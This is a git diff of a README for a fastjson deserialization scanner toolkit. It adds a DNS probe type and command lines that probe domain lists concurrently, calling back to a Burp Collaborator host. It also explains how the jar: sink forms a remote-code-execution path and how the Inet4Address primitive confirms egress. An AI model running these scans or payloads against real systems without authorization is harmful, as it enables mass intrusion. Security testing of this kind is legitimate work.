@@ -35,9 +35,10 @@ installs). Both scanners are **multithreaded** and take target/domain lists from
 # 1) inventory build artifacts / unpacked images (parallel)
 python3 scanner/fjscan_static.py /path/to/artifacts --threads 16
 
-# 2) active probe across many domains, concurrently, callbacks to your Burp Collaborator
-python3 scanner/fjscan_probe.py --collaborator <collab-or-ip> --targets domains.txt --threads 50
-cat domains.txt | python3 scanner/fjscan_probe.py --collaborator <ip> --targets -   # stdin
+# 2) active probe across many domains, concurrently, DNS callbacks to your Burp Collaborator
+#    (--probe-type dns is the Collaborator-compatible one; confirms fastjson + egress)
+python3 scanner/fjscan_probe.py --collaborator <sub>.oastify.com --probe-type dns --targets domains.txt --threads 50
+cat domains.txt | python3 scanner/fjscan_probe.py --collaborator <sub>.oastify.com --probe-type dns --targets -
 
 # 3) bulk payloads for manual testing (one per domain, stable correlation token)
 python3 scanner/fjpayload.py <collab-or-ip> --targets-file domains.txt
@@ -59,6 +60,7 @@ POST https://svc.example/v1/ingest
 |---|---|---|
 | `--canary-ip <ip>` | — | built-in listener mode; IP of this host as targets see it |
 | `--collaborator <v>` | — | external OOB (IPv4 / int / dot-free host / Collaborator subdomain) |
+| `--probe-type <t>` | `jsontype` | `jsontype` = RCE path (`jar:http` int-IP); `dns` = `Inet4Address` OOB via a **dotted** host (**Collaborator-compatible**, confirms fastjson+egress); `both` |
 | `--targets <file\|->` | — | target list; `-` reads stdin (**required**) |
 | `--threads N` | `20` | concurrent request workers |
 | `--scheme` / `--target-port` / `--path` | `http` / — / `/parse` | how bare domains are expanded |
@@ -73,10 +75,12 @@ POST https://svc.example/v1/ingest
 **`fjpayload.py`** (generator): `<collaborator>` · `--targets-file/-f <file\|->` (bulk) ·
 `--port` · `--token` · `--wrap` · `--entry`.
 
-> **Collaborator note:** the sink does `typeName.replace('.','/')`, so **every dot in the host
-> becomes a slash** — a dotted Burp Collaborator subdomain (`abc.oastify.com`) can't be used
-> directly. The tools encode hosts as **decimal integer IPs** and correlate on the unique URL
-> **path token** (Burp shows it in the HTTP interaction). See [`scanner/README.md`](scanner/README.md).
+> **Collaborator note:** the `@JSONType` `jar:` sink does `typeName.replace('.','/')`, so **every
+> dot in the host becomes a slash** — a dotted Burp Collaborator subdomain (`abc.oastify.com`)
+> can't be delivered through it (the tools fall back to an integer IP + URL path token). To get a
+> callback into a **public Collaborator**, use **`--probe-type dns`**: the `java.net.Inet4Address`
+> primitive accepts a dotted host and fires a DNS interaction (`<tok>.<sub>.oastify.com`),
+> confirming fastjson + `@type` handling + egress. See [`scanner/README.md`](scanner/README.md).
 
 ## The lab
 
